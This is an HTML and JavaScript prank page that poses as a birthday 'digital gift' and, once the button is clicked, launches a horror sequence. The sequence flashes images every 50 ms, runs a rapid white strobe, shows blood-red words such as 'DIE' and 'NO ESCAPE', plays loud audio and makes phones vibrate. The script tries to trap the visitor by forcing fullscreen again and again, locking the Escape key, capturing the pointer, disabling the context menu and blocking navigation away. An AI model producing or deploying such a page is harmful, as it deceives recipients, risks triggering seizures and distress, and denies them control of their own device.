<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Happy Birthday! ðŸŽ‚</title>
    <style>
        /* --- GLOBAL RESET --- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background: #000;
        }

        /* =========================================
           LAYER 1: THE INNOCENT "BAIT" UI (GLASSMORPHISM)
           ========================================= */
        #innocent-layer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(at top left, #a8c0ff, transparent),
                        radial-gradient(at bottom right, #3f2b96, transparent),
                        linear-gradient(to bottom right, #ff9a9e, #fad0c4);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 100;
            transition: opacity 0.2s ease-out;
            overflow: hidden;
        }

        .orb {
            position: absolute;
            border-radius: 50%;
            filter: blur(60px);
            opacity: 0.8;
            z-index: 101;
            animation: floatOrb 10s infinite ease-in-out;
        }

        .orb-1 { width: 300px; height: 300px; background: #8ec5fc; top: -50px; left: -50px; }
        .orb-2 { width: 400px; height: 400px; background: #e0c3fc; bottom: -100px; right: -100px; animation-delay: -5s; }

        @keyframes floatOrb {
            0%, 100% { transform: translate(0, 0) scale(1); }
            50% { transform: translate(30px, -30px) scale(1.1); }
        }

        .card {
            background: rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.3);
            padding: 50px 40px;
            border-radius: 30px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
            text-align: center;
            max-width: 90%;
            width: 450px;
            position: relative;
            z-index: 102;
        }

        .card h1 {
            color: #fff;
            font-size: 3rem;
            margin-bottom: 15px;
            font-weight: 700;
            text-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }

        .card p {
            color: rgba(255, 255, 255, 0.9);
            margin-bottom: 40px;
            font-size: 1.2rem;
            line-height: 1.6;
            font-weight: 500;
        }

        .btn-surprise {
            background: rgba(255, 255, 255, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.5);
            color: #fff;
            padding: 18px 45px;
            font-size: 1.1rem;
            font-weight: 600;
            border-radius: 50px;
            cursor: pointer;
            backdrop-filter: blur(5px);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
            transition: all 0.3s;
            outline: none;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .btn-surprise:hover { transform: translateY(-3px); background: rgba(255, 255, 255, 0.5); }
        .btn-surprise:active { transform: scale(0.95); }
        .btn-surprise:disabled { opacity: 0.6; cursor: not-allowed; }

        .loading-text {
            margin-top: 20px;
            font-size: 0.85rem;
            color: rgba(255, 255, 255, 0.7);
            opacity: 0;
            transition: opacity 0.3s;
        }

        .confetti {
            position: absolute;
            width: 10px;
            height: 10px;
            background-color: #fff;
            animation: fall linear forwards;
            z-index: 101;
            opacity: 0.8;
        }

        @keyframes fall { to { transform: translateY(100vh) rotate(720deg); } }

        /* =========================================
           LAYER 2: CHAOS & HORROR LAYERS
           ========================================= */
        #chaos-layer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 1;
            display: none;
        }

        .loop-img {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: none;
        }
        .loop-img.active { display: block; }

        /* NEW: STROBE LAYER */
        #strobe-layer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            z-index: 5;
            opacity: 0;
            pointer-events: none;
            display: none;
        }
        @keyframes strobe-anim {
            0% { opacity: 0; }
            50% { opacity: 0.15; }
            100% { opacity: 0; }
        }

        /* NEW: BLOOD TEXT LAYER */
        #glitch-text {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            /* Heavy font for maximum blood impact */
            font-family: 'Impact', 'Arial Black', 'Segoe UI Black', sans-serif; 
            font-weight: 900;
            text-transform: uppercase;
            z-index: 6;
            pointer-events: none;
            display: none;
            white-space: nowrap;
            /* Base red color */
            color: #8a0303; 
            /* Initial shadow */
            text-shadow: 2px 2px 0px #380000;
        }
        
        /* The Dripping Animation */
        .dripping-blood {
            animation: blood-drip-anim 1s infinite;
        }
        
        @keyframes blood-drip-anim {
            0% { 
                text-shadow: 2px 2px 0px #380000, 0 0 10px #ff0000; 
            }
            50% { 
                /* Smear down */
                text-shadow: 2px 20px 5px rgba(138, 3, 3, 0.8), 0 0 20px #ff0000; 
            }
            100% { 
                /* Fade out at bottom */
                text-shadow: 2px 40px 10px rgba(138, 3, 3, 0), 0 0 5px #ff0000; 
            }
        }

        #trap-net {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 9999;
            display: none;
            cursor: none;
        }

    </style>
</head>
<body>

    <audio id="bg-audio" loop>
        <source src="music.mp3" type="audio/mpeg">
    </audio>

    <!-- INNOCENT UI -->
    <div id="innocent-layer">
        <div class="orb orb-1"></div>
        <div class="orb orb-2"></div>
        <div class="card">
            <h1>Surprise! ðŸŽ‰</h1>
            <p>I've prepared a special digital gift for you.<br>Please ensure your volume is ON. ðŸ”Š</p>
            <button class="btn-surprise" id="trigger-btn" disabled>Loading Gift...</button>
            <div class="loading-text" id="load-status">Decrypting assets...</div>
        </div>
    </div>

    <!-- HORROR UI -->
    <div id="chaos-layer"></div>
    <div id="strobe-layer"></div>
    <div id="glitch-text"></div>
    <div id="trap-net"></div>

    <script>
        // CONFIGURATION
        const CONFIG = {
            imageCount: 15,          
            loopSpeed: 50,           
            fileExt: '.jpg'
        };

        const CREEPY_WORDS = ["I SEE YOU", "RUN", "HELP", "DIE", "LOOK BEHIND YOU", "666", "ERROR", "NO ESCAPE", "WAKE UP"];
        
        // Shades of blood: Fresh, Clotted, Dried, Black
        const BLOOD_COLORS = ['#ff0000', '#cc0000', '#8a0303', '#4d0000', '#300000'];

        // ELEMENTS
        const innocentLayer = document.getElementById('innocent-layer');
        const chaosLayer = document.getElementById('chaos-layer');
        const strobeLayer = document.getElementById('strobe-layer');
        const glitchText = document.getElementById('glitch-text');
        const triggerBtn = document.getElementById('trigger-btn');
        const loadStatus = document.getElementById('load-status');
        const chaosContainer = document.getElementById('chaos-layer');
        const audio = document.getElementById('bg-audio');
        const trapNet = document.getElementById('trap-net');

        let images = [];
        let loaded = 0;
        let activeIndex = 0;
        let isPrankActive = false;

        function preloadImages() {
            loadStatus.style.opacity = '1';
            for(let i=1; i <= CONFIG.imageCount; i++) {
                const img = new Image();
                img.src = `${i}${CONFIG.fileExt}`;
                img.className = 'loop-img';
                img.onload = () => { loaded++; checkLoad(); };
                img.onerror = () => { loaded++; checkLoad(); };
                images.push(img);
                chaosContainer.appendChild(img);
            }
        }

        function checkLoad() {
            if(loaded >= CONFIG.imageCount) {
                triggerBtn.disabled = false;
                triggerBtn.textContent = "Open Gift ðŸŽ";
                loadStatus.style.opacity = '0';
            }
        }

        triggerBtn.addEventListener('click', () => {
            isPrankActive = true;
            innocentLayer.style.display = 'none';
            chaosLayer.style.display = 'block';
            trapNet.style.display = 'block';
            
            // Activate Strobe & Glitch Text
            strobeLayer.style.display = 'block';
            strobeLayer.style.animation = 'strobe-anim 0.1s infinite';
            glitchText.style.display = 'block';
            // Add dripping blood animation class
            glitchText.classList.add('dripping-blood');

            forceFullscreen();
            audio.volume = 1.0;
            audio.play();
            startChaosLoop();
        });

        function startChaosLoop() {
            setInterval(() => {
                // 1. Image Loop
                images[activeIndex].classList.remove('active');
                activeIndex++;
                if(activeIndex >= images.length) activeIndex = 0;
                images[activeIndex].classList.add('active');

                // 2. Vibration (Mobile Only)
                if (navigator.vibrate) navigator.vibrate(50);

                // 3. Random Blood Text
                if (Math.random() > 0.6) {
                    glitchText.innerText = CREEPY_WORDS[Math.floor(Math.random() * CREEPY_WORDS.length)];
                    glitchText.style.fontSize = (Math.random() * 5 + 3) + 'rem';
                    
                    // Pick a random blood color
                    const bloodColor = BLOOD_COLORS[Math.floor(Math.random() * BLOOD_COLORS.length)];
                    glitchText.style.color = bloodColor;
                    
                    // Random Position
                    const randX = Math.floor(Math.random() * 80) + 10;
                    const randY = Math.floor(Math.random() * 80) + 10;
                    glitchText.style.left = randX + '%';
                    glitchText.style.top = randY + '%';
                }

            }, CONFIG.loopSpeed);
        }

        async function forceFullscreen() {
            const doc = document.documentElement;
            try {
                if (doc.requestFullscreen) await doc.requestFullscreen();
                else if (doc.webkitRequestFullscreen) await doc.webkitRequestFullscreen();
            } catch(e) {}
            
            try {
                if (navigator.keyboard && navigator.keyboard.lock) {
                    await navigator.keyboard.lock(['Escape']);
                }
            } catch(e) {}

            try { document.body.requestPointerLock(); } catch(e) {}
        }

        document.addEventListener('fullscreenchange', () => {
            if (!document.fullscreenElement && isPrankActive) {
                audio.play();
                forceFullscreen();
            }
        });

        ['click', 'mousemove', 'mousedown', 'touchstart', 'keydown', 'resize', 'focus'].forEach(evt => {
            window.addEventListener(evt, () => {
                if(isPrankActive && !document.fullscreenElement) forceFullscreen();
            });
        });

        window.onbeforeunload = function() {
            if(isPrankActive) return "Are you sure you want to leave?";
        };

        function createConfetti() {
            const colors = ['#fff', '#f0f', '#0ff', '#ff0'];
            const conf = document.createElement('div');
            conf.className = 'confetti';
            conf.style.left = Math.random() * 100 + 'vw';
            conf.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
            conf.style.animationDuration = (Math.random() * 3 + 2) + 's';
            innocentLayer.appendChild(conf);
            setTimeout(() => conf.remove(), 5000);
        }
        setInterval(createConfetti, 300);

        preloadImages();
        document.addEventListener('contextmenu', event => event.preventDefault());

    </script>
</body>
</html>
